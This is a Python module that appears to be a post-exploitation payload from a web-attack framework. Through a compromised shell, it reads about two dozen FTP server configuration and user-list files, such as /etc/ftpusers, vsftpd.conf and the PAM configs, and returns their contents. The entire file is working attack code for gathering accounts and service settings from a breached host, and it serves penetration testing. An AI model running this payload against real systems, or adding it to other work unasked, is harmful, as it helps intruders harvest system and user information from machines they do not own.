import re
from plugins.attack.payloads.base_payload import base_payload

class ftp_config_files(base_payload):
    '''
    This payload shows FTP Server configuration files
    '''
    def run_read(self):
        result = []
        files = []

        files.append('/etc/ftpd/ftpaccess')
        files.append('/etc/ftpd/ftpconversions')
        files.append('/etc/ftpd/ftphosts')
        files.append('/etc/ftpd/ftpusers')
        files.append('/etc/ftpd/ftpgroups')
        files.append('/etc/vsftpd.ftpusers')
        files.append('/etc/vsftpd/ftpusers')
        files.append('/etc/vsftpd.conf')
        files.append('/etc/vsftpd/vsftpd.conf')
        files.append('/etc/vsftp/vsftpd.conf')
        files.append('/usr/local/etc/vsftpd.conf')
        files.append('/opt/etc/vsftpd.conf')
        files.append('/etc/vsftpd.user_list')
        files.append('/etc/vsftpd/user_list')
        files.append('/etc/pam.d/vsftpd')
        files.append('/etc/ftpaccess')
        files.append('/etc/ftpusers')
        files.append('/etc/ftpservers')
        files.append('/etc/ftphosts')
        files.append('/etc/ftpconversions')
        files.append('/etc/pam.d/ftp')
        files.append('/etc/xinetd.d/wu-ftpd')
        files.append('/opt/bin/ftponly')


        for file in files:
            if self.shell.read(file):
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        if result == [ ]:
            result.append('FTP configuration files not found.')
        return result
        
